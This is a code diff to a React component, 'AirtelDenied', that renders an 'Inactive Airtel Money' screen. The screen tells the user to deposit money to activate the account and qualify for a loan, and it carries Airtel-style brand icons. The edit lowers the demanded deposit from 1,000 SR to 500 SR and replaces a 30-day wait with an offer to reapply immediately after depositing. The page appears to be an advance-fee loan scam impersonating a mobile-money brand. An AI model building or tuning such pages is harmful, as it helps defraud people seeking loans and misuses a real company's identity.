@@ -280,7 +280,7 @@ function AirtelDenied() {
             Inactive Airtel Money
           </div>
           <p className="inactive-text">Please deposit at least</p>
-          <p className="inactive-amount">1,000 SR</p>
+          <p className="inactive-amount">500 SR</p>
           <p className="inactive-text">
             to your Airtel Money account to activate it and qualify for a new loan.
           </p>
@@ -294,7 +294,7 @@ function AirtelDenied() {
           </div>
           <div className="checklist-item">
             <span className="checkmark">✓</span> 
-            You can try applying again after 30 days.
+            You can apply for the loan again immediately after depositing <strong>500 SR</strong>.
           </div>
         </div>
 
@@ -315,7 +315,6 @@ function AirtelDenied() {
 
       {/* BRAND ICONS FOOTER */}
       <div className="brand-icons-footer">
-        {/* Icon 1: Airtel Phone */}
         <div className="brand-icon">
           <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
             <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
@@ -323,7 +322,6 @@ function AirtelDenied() {
           </div>
         </div>
         
-        {/* Icon 2: Lock */}
         <div className="brand-icon">
           <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
             <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
@@ -333,7 +331,6 @@ function AirtelDenied() {
           </div>
         </div>
 
-        {/* Icon 3: Airtel Money */}
         <div className="brand-icon">
           <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
             <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
@@ -341,7 +338,6 @@ function AirtelDenied() {
           </div>
         </div>
 
-        {/* Icon 4: Currency Symbol */}
         <div className="brand-icon">
           <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
             <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
